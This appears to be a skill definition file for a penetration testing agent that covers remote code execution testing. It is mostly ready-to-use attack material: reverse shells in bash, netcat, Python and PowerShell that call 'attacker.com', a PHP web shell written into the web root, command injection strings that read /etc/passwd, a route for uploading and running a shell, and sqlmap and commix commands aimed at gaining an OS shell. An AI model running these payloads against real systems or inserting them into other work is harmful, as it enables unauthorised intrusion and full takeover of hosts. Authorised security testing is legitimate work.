---
id: rce-testing
name: Remote Code Execution Testing
description: 远程代码执行与高危执行链测试的专业技能和方法论
version: 1.0.0
aliases:
  - rce
  - remote-code-execution
tags:
  - rce
  - injection
  - exploit
target_types:
  - web
  - api
  - host
---

# RCE Testing Skill

## Overview
Remote Code Execution (RCE) allows attackers to execute arbitrary commands on the target system.

## Testing Methodology

### 1. Detection Vectors

#### Command Injection
```
# Common parameters
?q=
?cmd=
?exec=
?command=
?ping=
?system=
?output=
?do=
?run=
?php?
?.php=
```

#### File Upload
```
/upload
/upload.php
/upload.aspx
/file upload
```

### 2. Basic Payloads

#### Linux
```bash
# Detection
whoami
id
uname -a
cat /etc/passwd

# Blind testing
sleep 5
ping -c 5 127.0.0.1

# Reverse shell
bash -i >& /dev/tcp/attacker.com/port 0>&1
nc -e /bin/bash attacker.com port
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker.com",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# File write
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

#### Windows
```powershell
# Detection
whoami
hostname
ipconfig
dir C:\

# Blind testing
ping -n 5 127.0.0.1
timeout /t 5

# Reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',port);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 3. Deserialization
```java
// Java deserialization
ObjectInputStream.readObject()
YSOSerial payload
```

```python
# Python pickle
pickle.loads(data)
```

### 4. Testing Commands
```bash
# Command injection detection
curl 'http://target.com/ping?ip=127.0.0.1'
curl 'http://target.com/ping?ip=127.0.0.1;sleep+5'
curl 'http://target.com/ping?ip=127.0.0.1|cat+/etc/passwd'

# Time-based detection
time curl 'http://target.com/ping?ip=127.0.0.1%3Bsleep+5'

# File upload RCE
curl -X POST -F "file=@shell.php" http://target.com/upload.php
curl http://target.com/shell.php?cmd=whoami
```

### 5. Tools
```bash
# nuclei RCE templates
nuclei -u https://target.com -t rce.yaml

# commix
python3 commix.py --url="http://target.com/?q=INJECT_HERE"

# sqlmap with OS shell
sqlmap -r req.txt --os-shell
```

## Testing Checklist
- [ ] Identify code execution points
- [ ] Test command injection payloads
- [ ] Test time-based blind injection
- [ ] Test file upload functionality
- [ ] Test deserialization
- [ ] Test template injection
- [ ] Attempt reverse shell
- [ ] Document with PoC
